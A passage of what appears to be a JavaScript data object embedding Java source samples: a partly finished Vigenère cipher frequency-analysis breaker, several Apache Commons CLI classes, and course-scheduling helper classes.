		            String text = "";
		            while ((text = reader.readLine()) != null) {
		                cipher = cipher + text;
		            }
		            cipher = cipher.trim();
		            cipher = cipher.replace(" ","");
		            String keylength = args[1];
		            int arrSize = cipher.length() / Integer.parseInt(keylength);
		            char[] alphabet = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
		            HashMap&ltCharacter,Integer&gt dic = new HashMap&ltCharacter, Integer&gt();
		            for(int i = 0; i &lt alphabet.length; i++){
		                dic.put(alphabet[i],0);
		            }
		            for (int i = 0; i &lt cipher.length(); i++){
		                char c = cipher.charAt(i);
		                dic.put(c,dic.get(c)+1);
		            }
		            ArrayList&ltString&gt al = new ArrayList();
		            for(int i = 0; i &lt Integer.parseInt(keylength); i++){
		                al.add("");
		            }
		            for(int i = 0; i &lt cipher.length(); i++){
		                String s = cipher.substring(i,i+1);
		                int test = i % Integer.parseInt(keylength);
		                String str = "";
		                switch(test){
		                    case(0):
		                        str = al.get(0);
		                        str = str + s;
		                        al.remove(0);
		                        al.add(0, str);
		                        break;
		                    case(1):
		                        str = al.get(1);
		                        str = str + s;
		                        al.remove(1);
		                        al.add(1, str);
		                        break;
		                    case(2):
		                        str = al.get(2);
		                        str = str + s;
		                        al.remove(2);
		                        al.add(2, str);
		                        break;
		                    case(3):
		                        str = al.get(3);
		                        str = str + s;
		                        al.remove(3);
		                        al.add(3, str);
		                        break;
		                    case(4):
		                        str = al.get(4);
		                        str = str + s;
		                        al.remove(4);
		                        al.add(4, str);
		                        break;
		                    case(5):
		                        str = al.get(5);
		                        str = str + s;
		                        al.remove(5);
		                        al.add(5, str);
		                        break;
		                }
		            }

		            HashMap&ltString,Integer&gt dic1 = new HashMap&ltString, Integer&gt();
		            HashMap&ltString,Integer&gt dic2 = new HashMap&ltString, Integer&gt();
		            HashMap&ltString,Integer&gt dic3 = new HashMap&ltString, Integer&gt();
		            HashMap&ltString,Integer&gt dic4 = new HashMap&ltString, Integer&gt();
		            HashMap&ltString,Integer&gt dic5 = new HashMap&ltString, Integer&gt();
		            HashMap&ltString,Integer&gt dic6 = new HashMap&ltString, Integer&gt();
		            String[] alp = new String[alphabet.length];

		            for(int k = 0; k &lt alp.length; k ++){
		                alp[k] = Character.toString(alphabet[k]);
		                dic1.put(alp[k],0);
		                dic2.put(alp[k],0);
		                dic3.put(alp[k],0);
		                dic4.put(alp[k],0);
		                dic5.put(alp[k],0);
		                dic6.put(alp[k],0);
		            }

		            for(int j = 0; j &lt al.size(); j++){
		                for (int i = 0; i &lt al.get(j).length(); i++){
		                    String c = al.get(j);
		                    char c2 = c.charAt(i);
		                    c = Character.toString(c2);
		                    switch (j){
		                        case(0):
		                            dic1.put(c,dic1.get(c)+1);
		                            break;
		                        case(1):
		                            dic2.put(c,dic2.get(c)+1);
		                            break;
		                        case(2):
		                            dic3.put(c,dic3.get(c)+1);
		                            break;
		                        case(3):
		                            dic4.put(c,dic4.get(c)+1);
		                            break;
		                        case(4):
		                            dic5.put(c,dic5.get(c)+1);
		                            break;
		                        case(5):
		                            dic6.put(c,dic6.get(c)+1);
		                            break;
		                    }
		                }
		            }

		            int maxval1 = 0;
		            int maxidx1 = 0;
		            for (int i = 0; i &lt dic1.size(); i++){
		                int[] val = new int[dic1.values().size()];
		                Object[] obj = dic1.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval1){
		                        maxval1 = val[j];
		                        maxidx1 = j;
		                    }
		                }
		            }
		            int maxval2 = 0;
		            int maxidx2 = 0;
		            for (int i = 0; i &lt dic2.size(); i++){
		                int[] val = new int[dic2.values().size()];
		                Object[] obj = dic2.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval2){
		                        maxval2 = val[j];
		                        maxidx2 = j;
		                    }
		                }
		            }
		            int maxval3 = 0;
		            int maxidx3 = 0;
		            for (int i = 0; i &lt dic3.size(); i++){
		                int[] val = new int[dic3.values().size()];
		                Object[] obj = dic3.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval3){
		                        maxval3 = val[j];
		                        maxidx3 = j;
		                    }
		                }
		            }
		            int maxval4 = 0;
		            int maxidx4 = 0;
		            for (int i = 0; i &lt dic4.size(); i++){
		                int[] val = new int[dic4.values().size()];
		                Object[] obj = dic4.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval4){
		                        maxval4 = val[j];
		                        maxidx4 = j;
		                    }
		                }
		            }
		            int maxval5 = 0;
		            int maxidx5 = 0;
		            for (int i = 0; i &lt dic5.size(); i++){
		                int[] val = new int[dic5.values().size()];
		                Object[] obj = dic5.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval5){
		                        maxval5 = val[j];
		                        maxidx5 = j;
		                    }
		                }
		            }
		            int maxval6 = 0;
		            int maxidx6 = 0;
		            for (int i = 0; i &lt dic6.size(); i++){
		                int[] val = new int[dic6.values().size()];
		                Object[] obj = dic6.values().toArray();
		                for(int j = 0; j &lt val.length; j++){
		                    val[j] = ((Integer) obj[j]).intValue();
		                }
		                for(int j = 0; j &lt val.length; j++){
		                    if(val[j] &gt maxval6){
		                        maxval6 = val[j];
		                        maxidx6 = j;
		                    }
		                }
		            }
		            String[][] vc = new String[26][26];
		            for (int row = 0; row &lt 26; row++){
		                for (int col = 0; col &lt 26; col++){
		                    vc[row][col] = Character.toString((alphabet[(row + col)%26]));
		                }
		            }

		            String key1 = getKeyword(vc,alp,keylength, maxidx1);
		            String key2 = getKeyword(vc,alp,keylength, maxidx2);
		            String key3 = getKeyword(vc,alp,keylength, maxidx3);
		            String key4 = getKeyword(vc,alp,keylength, maxidx4);
		            String key5 = getKeyword(vc,alp,keylength, maxidx5);
		            String key6 = getKeyword(vc,alp,keylength, maxidx6);

		            String key = key1 + key2 + key3 + key4 + key5 + key6;
		            System.out.println("The believed keyword is: " + key);
		            /* Fill in the cases to replace each letter according to the offset key */
		            String[] ndic1 = new String[dic1.size()];
		            String[] ndic2 = new String[dic2.size()];
		            String[] ndic3 = new String[dic3.size()];
		            String[] ndic4 = new String[dic4.size()];
		            String[] ndic5 = new String[dic5.size()];
		            String[] ndic6 = new String[dic6.size()];
		            for(int i = 0; i &lt cipher.length(); i++){
		                String s = cipher.substring(i,i+1);
		                int test = i % Integer.parseInt(keylength);
		                String str = "";
		                switch(test){
		                    case(0):
		                        int rowidx = 0;
		                        for(int r = 0; r &lt 26; r++){
		                            if(alp[r].equals(key1)){
		                                rowidx = r;
		                            }
		                        }
		                        String[] alpa = vc[rowidx];
		                        String result = "";
		                        for(int j = 0; j &lt al.size(); j++){
		                            String str1 = al.get(j);
		                            int idx = 0;
		                            for(int k = 0; k &lt str1.length(); k++){
		                                String letter = str1.substring(k,k+1);
		                                for (int l = 0; l &lt 26; l++){
		                                    if(letter.equals(alpa[l])){
		                                        idx = l;
		                                    }
		                                }
		                               result = result + alp[idx];
		                            }
		                        }
		                        System.out.println(result);
		                        break;
		                    case(1):

		                        break;
		                    case(2):

		                        break;
		                    case(3):

		                        break;
		                    case(4):

		                        break;
		                    case(5):

		                        break;
		                }
		            }
		        }
		        catch (java.io.IOException e){
		            System.out.println("Could not read file");
		        }

		    }

		    public static String getKeyword(String[][] vc, String[] alphabet, String keylength, int idx){
		        String keyword = "";
		        int rowidx = 0;
		        for(int r = 0; r &lt 26; r++){
		            if(alphabet[idx].equals(vc[r][4])){
		                rowidx = r;
		            }
		        }
		        keyword = vc[rowidx][0];
		        return keyword;
		    }
		}`
	},
	ai1: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Thrown when more than one option in an option group
		 * has been provided.
		 *
		 * @version $Id: AlreadySelectedException.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public class AlreadySelectedException extends ParseException
		{
		    /**
		     * This exception {@code serialVersionUID}.
		     */
		    private static final long serialVersionUID = 3674381532418544760L;

		    /** The option group selected. */
		    private OptionGroup group;

		    /** The option that triggered the exception. */
		    private Option option;

		    /**
		     * Construct a new <code>AlreadySelectedException</code>
		     * with the specified detail message.
		     *
		     * @param message the detail message
		     */
		    public AlreadySelectedException(String message)
		    {
		        super(message);
		    }

		    /**
		     * Construct a new <code>AlreadySelectedException</code>
		     * for the specified option group.
		     *
		     * @param group  the option group already selected
		     * @param option the option that triggered the exception
		     * @since 1.2
		     */
		    public AlreadySelectedException(OptionGroup group, Option option)
		    {
		        this("The option '" + option.getKey() + "' was specified but an option from this group "
		                + "has already been selected: '" + group.getSelected() + "'");
		        this.group = group;
		        this.option = option;
		    }

		    /**
		     * Returns the option group where another option has been selected.
		     *
		     * @return the related option group
		     * @since 1.2
		     */
		    public OptionGroup getOptionGroup()
		    {
		        return group;
		    }

		    /**
		     * Returns the option that was added to the group and triggered the exception.
		     *
		     * @return the related option
		     * @since 1.2
		     */
		    public Option getOption()
		    {
		        return option;
		    }
		}`
	},
	ai2: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.Collection;
		import java.util.Iterator;

		/**
		 * Exception thrown when an option can't be identified from a partial name.
		 * 
		 * @version $Id: AmbiguousOptionException.java 1669814 2015-03-28 18:09:26Z britter $
		 * @since 1.3
		 */
		public class AmbiguousOptionException extends UnrecognizedOptionException
		{
		    /**
		     * This exception {@code serialVersionUID}.
		     */
		    private static final long serialVersionUID = 5829816121277947229L;

		    /** The list of options matching the partial name specified */
		    private final Collection<String> matchingOptions;

		    /**
		     * Constructs a new AmbiguousOptionException.
		     *
		     * @param option          the partial option name
		     * @param matchingOptions the options matching the name
		     */
		    public AmbiguousOptionException(String option, Collection<String> matchingOptions)
		    {
		        super(createMessage(option, matchingOptions), option);
		        this.matchingOptions = matchingOptions;
		    }

		    /**
		     * Returns the options matching the partial name.
		     * @return a collection of options matching the name
		     */
		    public Collection<String> getMatchingOptions()
		    {
		        return matchingOptions;
		    }

		    /**
		     * Build the exception message from the specified list of options.
		     * 
		     * @param option
		     * @param matchingOptions
		     * @return
		     */
		    private static String createMessage(String option, Collection<String> matchingOptions)
		    {
		        StringBuilder buf = new StringBuilder("Ambiguous option: '");
		        buf.append(option);
		        buf.append("'  (could be: ");

		        Iterator<String> it = matchingOptions.iterator();
		        while (it.hasNext())
		        {
		            buf.append("'");
		            buf.append(it.next());
		            buf.append("'");
		            if (it.hasNext())
		            {
		                buf.append(", ");
		            }
		        }
		        buf.append(")");

		        return buf.toString();
		    }
		}`
	},
	ai3: {
		type: 'java',
		code: `
		/* APair
		* Custom class to represent pairs of (class, labs), (class, class), or (lab, lab)
		* Takes a string which is of the form: Faculty Course# LEC LecSec TUT TutSec, Faculty Course# LEC LecSec TUT TutSec
		* Contains get methods for each private variable
		 */



		public class APair {

		    private String fac1;
		    private String fac2;
		    private int cnum1;
		    private int lsec1;
		    private int cnum2;
		    private int lsec2;
		    private int tsec1;
		    private int tsec2;

		    public APair(String s){
		        String[] arr = s.split(",");
		        String[] arr1 = arr[0].trim().split(" ");
		        if(arr1.length &gt 4) {
		            int count = 0;
		            for (String st : arr1) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr1.length - count];
		            int i = 0;
		            for (String st : arr1){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr1 = ndata;
		        }
		        String[] arr2 = arr[1].trim().split(" ");
		        if(arr2.length &gt 4) {
		            int count = 0;
		            for (String st : arr2) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr2.length - count];
		            int i = 0;
		            for (String st : arr2){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr2 = ndata;
		        }
		        if(arr1[2].equals("LEC") && arr2[2].equals("LEC")){
		            this.fac1 = arr1[0].trim();
		            this.fac2 = arr2[0].trim();
		            this.cnum1 = Integer.parseInt(arr1[1].trim());
		            this.cnum2 = Integer.parseInt(arr2[1].trim());
		            this.lsec1 = Integer.parseInt(arr1[3].trim());
		            this.lsec2 = Integer.parseInt(arr2[3].trim());
		            this.tsec1 = -1;
		            this.tsec2 = -1;
		        }
		        else if(arr1[2].equals("LEC") && arr2[2].equals("TUT")){
		            this.fac1 = arr1[0].trim();
		            this.fac2 = arr2[0].trim();
		            this.cnum1 = Integer.parseInt(arr1[1].trim());
		            this.cnum2 = Integer.parseInt(arr2[1].trim());
		            this.lsec1 = Integer.parseInt(arr1[3].trim());
		            this.lsec2 = -1;
		            this.tsec1 = -1;
		            this.tsec2 = Integer.parseInt(arr2[3].trim());
		        }

		        else if(arr1[2].equals("TUT") && arr2[2].equals("TUT")){
		            this.fac1 = arr1[0].trim();
		            this.fac2 = arr2[0].trim();
		            this.cnum1 = Integer.parseInt(arr1[1].trim());
		            this.cnum2 = Integer.parseInt(arr2[1].trim());
		            this.lsec1 = -1;
		            this.lsec2 = -1;
		            this.tsec1 = Integer.parseInt(arr1[3].trim());
		            this.tsec2 = Integer.parseInt(arr2[3].trim());
		        }
		    }

		    public APair(String fac1, String fac2, int cnum1, int lsec1, int cnum2, int lsec2, int tsec1, int tsec2){
		        this.fac1 = fac1;
		        this.fac2 = fac2;
		        this.cnum1 = cnum1;
		        this.cnum2 = cnum2;
		        this.lsec1 = lsec1;
		        this.lsec2 = lsec2;
		        this.tsec1 = tsec1;
		        this.tsec2 = tsec2;
		    }
		    public String getFaculty1(){ return this.fac1; }
		    public String getFaculty2() { return this.fac2; }
		    public int getCourseNum1() { return this.cnum1; }
		    public int getCourseNum2() { return this.cnum2; }
		    public int getLecSec1() { return this.lsec1; }
		    public int getLecSec2() { return this.lsec2; }
		    public int getTutSec1() { return this.tsec1; }
		    public int getTutSec2() { return this.tsec2; }
		}`
	},
	ai4: {
		type: 'java',
		code: `
		import org.apache.commons.cli.Option;
		import java.util.ArrayList;
		import java.util.HashMap;
		import java.util.List;

		public class Assignments {
		    //Has course/Lab and courseslot / labslot
		    public Course course;
		    public CourseSlot courseSlot;
		    public Lab lab;
		    public LabSlot labSlot;

		    public Assignments(Course c, CourseSlot cs){
		        this.course = c;
		        this.courseSlot = cs;
		        this.lab = null;
		        this.labSlot = null;
		    }

		    public Assignments(Lab l, LabSlot ls){
		        this.course = null;
		        this.courseSlot = null;
		        this.lab = l;
		        this.labSlot = ls;
		    }

		    public Course getCourse() {
		        return this.course;
		    }

		    public CourseSlot getCourseSlot() {
		        return this.courseSlot;
		    }

		    public Lab getLab() {
		        return this.lab;
		    }

		    public LabSlot getLabSlot() {
		        return this.labSlot;
		    }
		}`
	},
	ai5: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * The class BasicParser provides a very simple implementation of
		 * the {@link Parser#flatten(Options,String[],boolean) flatten} method.
		 *
		 * @version $Id: BasicParser.java 1443102 2013-02-06 18:12:16Z tn $
		 * @deprecated since 1.3, use the {@link DefaultParser} instead
		 */
		@Deprecated
		public class BasicParser extends Parser
		{
		    /**
		     * &ltp&gtA simple implementation of {@link Parser}'s abstract
		     * {@link Parser#flatten(Options, String[], boolean) flatten} method.&lt/p&gt
		     *
		     * &ltp&gt&ltb&gtNote:&lt/b&gt &ltcode&gtoptions&lt/code&gt and &ltcode&gtstopAtNonOption&lt/code&gt
		     * are not used in this &ltcode&gtflatten&lt/code&gt method.&lt/p&gt
		     *
		     * @param options The command line {@link Options}
		     * @param arguments The command line arguments to be parsed
		     * @param stopAtNonOption Specifies whether to stop flattening
		     * when an non option is found.
		     * @return The &ltcode&gtarguments&lt/code&gt String array.
		     */
		    @Override
		    protected String[] flatten(@SuppressWarnings("unused") Options options,
		            String[] arguments,
		            @SuppressWarnings("unused") boolean stopAtNonOption)
		    {
		        // just echo the arguments
		        return arguments;
		    }
		}`
	},
	ai6: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.Serializable;
		import java.util.ArrayList;
		import java.util.Collection;
		import java.util.Iterator;
		import java.util.LinkedList;
		import java.util.List;
		import java.util.Properties;

		/**
		 * Represents list of arguments parsed against a {@link Options} descriptor.
		 * &ltp&gt
		 * It allows querying of a boolean {@link #hasOption(String opt)},
		 * in addition to retrieving the {@link #getOptionValue(String opt)}
		 * for options requiring arguments.
		 * &ltp&gt
		 * Additionally, any left-over or unrecognized arguments,
		 * are available for further processing.
		 *
		 * @version $Id: CommandLine.java 1786144 2017-03-09 11:34:57Z britter $
		 */
		public class CommandLine implements Serializable
		{
		    /** The serial version UID. */
		    private static final long serialVersionUID = 1L;

		    /** the unrecognized options/arguments */
		    private final List&ltString&gt args = new LinkedList&ltString&gt();

		    /** the processed options */
		    private final List&ltOption&gt options = new ArrayList&ltOption&gt();

		    /**
		     * Creates a command line.
		     */
		    protected CommandLine()
		    {
		        // nothing to do
		    }

		    /** 
		     * Query to see if an option has been set.
		     *
		     * @param opt Short name of the option
		     * @return true if set, false if not
		     */
		    public boolean hasOption(String opt)
		    {
		        return options.contains(resolveOption(opt));
		    }

		    /** 
		     * Query to see if an option has been set.
		     *
		     * @param opt character name of the option
		     * @return true if set, false if not
		     */
		    public boolean hasOption(char opt)
		    {
		        return hasOption(String.valueOf(opt));
		    }

		    /**
		     * Return the &ltcode&gtObject&lt/code&gt type of this &ltcode&gtOption&lt/code&gt.
		     *
		     * @param opt the name of the option
		     * @return the type of this &ltcode&gtOption&lt/code&gt
		     * @deprecated due to System.err message. Instead use getParsedOptionValue(String)
		     */
		    @Deprecated
		    public Object getOptionObject(String opt)
		    {
		        try
		        {
		            return getParsedOptionValue(opt);
		        }
		        catch (ParseException pe)
		        {
		            System.err.println("Exception found converting " + opt + " to desired type: " + pe.getMessage());
		            return null;
		        }
		    }

		    /**
		     * Return a version of this &ltcode&gtOption&lt/code&gt converted to a particular type. 
		     *
		     * @param opt the name of the option
		     * @return the value parsed into a particular object
		     * @throws ParseException if there are problems turning the option value into the desired type
		     * @see PatternOptionBuilder
		     * @since 1.2
		     */
		    public Object getParsedOptionValue(String opt) throws ParseException
		    {
		        String res = getOptionValue(opt);
		        Option option = resolveOption(opt);
		        
		        if (option == null || res == null)
		        {
		            return null;
		        }
		        
		        return TypeHandler.createValue(res, option.getType());
		    }

		    /**
		     * Return the &ltcode&gtObject&lt/code&gt type of this &ltcode&gtOption&lt/code&gt.
		     *
		     * @param opt the name of the option
		     * @return the type of opt
		     */
		    public Object getOptionObject(char opt)
		    {
		        return getOptionObject(String.valueOf(opt));
		    }

		    /** 
		     * Retrieve the first argument, if any, of this option.
		     *
		     * @param opt the name of the option
		     * @return Value of the argument if option is set, and has an argument,
		     * otherwise null.
		     */
		    public String getOptionValue(String opt)
		    {
		        String[] values = getOptionValues(opt);

		        return (values == null) ? null : values[0];
		    }

		    /** 
		     * Retrieve the first argument, if any, of this option.
		     *
		     * @param opt the character name of the option
		     * @return Value of the argument if option is set, and has an argument,
		     * otherwise null.
		     */
		    public String getOptionValue(char opt)
		    {
		        return getOptionValue(String.valueOf(opt));
		    }

		    /** 
		     * Retrieves the array of values, if any, of an option.
		     *
		     * @param opt string name of the option
		     * @return Values of the argument if option is set, and has an argument,
		     * otherwise null.
		     */
		    public String[] getOptionValues(String opt)
		    {
		        List&ltString&gt values = new ArrayList&ltString&gt();

		        for (Option option : options)
		        {
		            if (opt.equals(option.getOpt()) || opt.equals(option.getLongOpt()))
		            {
		                values.addAll(option.getValuesList());
		            }
		        }

		        return values.isEmpty() ? null : values.toArray(new String[values.size()]);
		    }

		    /**
		     * Retrieves the option object given the long or short option as a String
		     * 
		     * @param opt short or long name of the option
		     * @return Canonicalized option
		     */
		    private Option resolveOption(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);
		        for (Option option : options)
		        {
		            if (opt.equals(option.getOpt()))
		            {
		                return option;
		            }

		            if (opt.equals(option.getLongOpt()))
		            {
		                return option;
		            }

		        }
		        return null;
		    }

		    /** 
		     * Retrieves the array of values, if any, of an option.
		     *
		     * @param opt character name of the option
		     * @return Values of the argument if option is set, and has an argument,
		     * otherwise null.
		     */
		    public String[] getOptionValues(char opt)
		    {
		        return getOptionValues(String.valueOf(opt));
		    }

		    /** 
		     * Retrieve the first argument, if any, of an option.
		     *
		     * @param opt name of the option
		     * @param defaultValue is the default value to be returned if the option
		     * is not specified
		     * @return Value of the argument if option is set, and has an argument,
		     * otherwise &ltcode&gtdefaultValue&lt/code&gt.
		     */
		    public String getOptionValue(String opt, String defaultValue)
		    {
		        String answer = getOptionValue(opt);

		        return (answer != null) ? answer : defaultValue;
		    }

		    /** 
		     * Retrieve the argument, if any, of an option.
		     *
		     * @param opt character name of the option
		     * @param defaultValue is the default value to be returned if the option
		     * is not specified
		     * @return Value of the argument if option is set, and has an argument,
		     * otherwise &ltcode&gtdefaultValue&lt/code&gt.
		     */
		    public String getOptionValue(char opt, String defaultValue)
		    {
		        return getOptionValue(String.valueOf(opt), defaultValue);
		    }

		    /**
		     * Retrieve the map of values associated to the option. This is convenient
		     * for options specifying Java properties like &lttt&gt-Dparam1=value1
		     * -Dparam2=value2&lt/tt&gt. The first argument of the option is the key, and
		     * the 2nd argument is the value. If the option has only one argument
		     * (&lttt&gt-Dfoo&lt/tt&gt) it is considered as a boolean flag and the value is
		     * &lttt&gt"true"&lt/tt&gt.
		     *
		     * @param opt name of the option
		     * @return The Properties mapped by the option, never &lttt&gtnull&lt/tt&gt
		     *         even if the option doesn't exists
		     * @since 1.2
		     */
		    public Properties getOptionProperties(String opt)
		    {
		        Properties props = new Properties();

		        for (Option option : options)
		        {
		            if (opt.equals(option.getOpt()) || opt.equals(option.getLongOpt()))
		            {
		                List&ltString&gt values = option.getValuesList();
		                if (values.size() &gt= 2)
		                {
		                    // use the first 2 arguments as the key/value pair
		                    props.put(values.get(0), values.get(1));
		                }
		                else if (values.size() == 1)
		                {
		                    // no explicit value, handle it as a boolean
		                    props.put(values.get(0), "true");
		                }
		            }
		        }

		        return props;
		    }

		    /** 
		     * Retrieve any left-over non-recognized options and arguments
		     *
		     * @return remaining items passed in but not parsed as an array
		     */
		    public String[] getArgs()
		    {
		        String[] answer = new String[args.size()];

		        args.toArray(answer);

		        return answer;
		    }

		    /** 
		     * Retrieve any left-over non-recognized options and arguments
		     *
		     * @return remaining items passed in but not parsed as a &ltcode&gtList&lt/code&gt.
		     */
		    public List&ltString&gt getArgList()
		    {
		        return args;
		    }

		    /** 
		     * jkeyes
		     * - commented out until it is implemented properly
		     * &ltp&gtDump state, suitable for debugging.&lt/p&gt
		     *
		     * @return Stringified form of this object
		     */

		    /*
		    public String toString() {
		        StringBuilder buf = new StringBuilder();
		            
		        buf.append("[ CommandLine: [ options: ");
		        buf.append(options.toString());
		        buf.append(" ] [ args: ");
		        buf.append(args.toString());
		        buf.append(" ] ]");
		            
		        return buf.toString();
		    }
		    */

		    /**
		     * Add left-over unrecognized option/argument.
		     *
		     * @param arg the unrecognized option/argument.
		     */
		    protected void addArg(String arg)
		    {
		        args.add(arg);
		    }

		    /**
		     * Add an option to the command line.  The values of the option are stored.
		     *
		     * @param opt the processed option
		     */
		    protected void addOption(Option opt)
		    {
		        options.add(opt);
		    }

		    /**
		     * Returns an iterator over the Option members of CommandLine.
		     *
		     * @return an &ltcode&gtIterator&lt/code&gt over the processed {@link Option}
		     * members of this {@link CommandLine}
		     */
		    public Iterator&ltOption&gt iterator()
		    {
		        return options.iterator();
		    }

		    /**
		     * Returns an array of the processed {@link Option}s.
		     *
		     * @return an array of the processed {@link Option}s.
		     */
		    public Option[] getOptions()
		    {
		        Collection&ltOption&gt processed = options;

		        // reinitialise array
		        Option[] optionsArray = new Option[processed.size()];

		        // return the array
		        return processed.toArray(optionsArray);
		    }

		    /**
		     * A nested builder class to create &ltcode&gtCommandLine&lt/code&gt instance
		     * using descriptive methods.
		     * 
		     * @since 1.4
		     */
		    public static final class Builder
		    {
		        /**
		         * CommandLine that is being build by this Builder.
		         */
		        private final CommandLine commandLine = new CommandLine();

		        /**
		         * Add an option to the command line. The values of the option are stored.
		         *
		         * @param opt the processed option
		         *
		         * @return this Builder instance for method chaining.
		         */
		        public Builder addOption(Option opt)
		        {
		            commandLine.addOption(opt);
		            return this;
		        }

		        /**
		         * Add left-over unrecognized option/argument.
		         *
		         * @param arg the unrecognized option/argument.
		         *
		         * @return this Builder instance for method chaining.
		         */
		        public Builder addArg(String arg)
		        {
		            commandLine.addArg(arg);
		            return this;
		        }

		        public CommandLine build()
		        {
		            return commandLine;
		        }
		    }
		}`
	},
	ai7: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * A class that implements the &ltcode&gtCommandLineParser&lt/code&gt interface
		 * can parse a String array according to the {@link Options} specified
		 * and return a {@link CommandLine}.
		 *
		 * @version $Id: CommandLineParser.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public interface CommandLineParser
		{
		    /**
		     * Parse the arguments according to the specified options.
		     *
		     * @param options the specified Options
		     * @param arguments the command line arguments
		     * @return the list of atomic option and value tokens
		     *
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    CommandLine parse(Options options, String[] arguments) throws ParseException;

		    /**
		     * Parse the arguments according to the specified options and
		     * properties.
		     *
		     * @param options the specified Options
		     * @param arguments the command line arguments
		     * @param properties command line option name-value pairs
		     * @return the list of atomic option and value tokens
		     *
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    /* To maintain binary compatibility, this is commented out.
		       It is still in the abstract Parser class, so most users will
		       still reap the benefit.
		    CommandLine parse(Options options, String[] arguments, Properties properties)
		               throws ParseException;
		     */

		    /**
		     * Parse the arguments according to the specified options.
		     *
		     * @param options the specified Options
		     * @param arguments the command line arguments
		     * @param stopAtNonOption if &lttt&gttrue&lt/tt&gt an unrecognized argument stops
		     *     the parsing and the remaining arguments are added to the 
		     *     {@link CommandLine}s args list. If &lttt&gtfalse&lt/tt&gt an unrecognized
		     *     argument triggers a ParseException.
		     *
		     * @return the list of atomic option and value tokens
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    CommandLine parse(Options options, String[] arguments, boolean stopAtNonOption) throws ParseException;

		    /**
		     * Parse the arguments according to the specified options and
		     * properties.
		     *
